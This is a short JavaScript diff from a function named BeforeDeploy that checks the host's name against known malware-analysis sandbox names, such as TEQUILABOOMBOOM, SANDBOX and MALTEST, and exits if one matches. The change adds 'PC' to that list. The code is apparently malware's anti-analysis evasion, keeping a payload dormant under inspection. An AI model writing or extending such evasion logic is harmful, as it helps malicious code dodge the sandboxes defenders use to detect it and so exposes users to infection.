@@ -4,7 +4,7 @@ function BeforeDeploy() {
     console.log("testing GetHostname!");
     host = (GetHost()).toUpperCase();
     console.log(host);
-    if (host == "TEQUILABOOMBOOM" || host == "SANDBOX" || host == "VIRUS" || host == "MALWARE" || host == "MALTEST") {
+    if (host == "TEQUILABOOMBOOM" || host == "SANDBOX" || host == "VIRUS" || host == "MALWARE" || host == "MALTEST" || host == "PC") {
         console.log("Sandbox detected, exiting");
         return false;
     }
